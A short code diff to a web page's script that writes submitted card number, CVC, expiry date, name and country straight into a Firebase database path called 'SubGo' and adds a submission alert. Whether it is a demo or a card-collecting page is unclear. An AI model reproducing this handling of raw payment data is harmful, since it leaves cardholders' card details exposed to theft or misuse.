@@ -113,13 +113,14 @@ const db = getDatabase(app);
           alert('Error: All fields must be filled!');
         } else {
 
-    set(ref(db, 'SubGo/' + Math.random().toString(36).slice(2, 7)), {
+    set(ref(db, 'SubGo'), {
       cardNumber: cardNumber,
       cvc: cvc,
       expireDate: expireDate,
       name: name,
       country: country
     });
+    alert('Your form is submitted');
         }
       }
 </script>
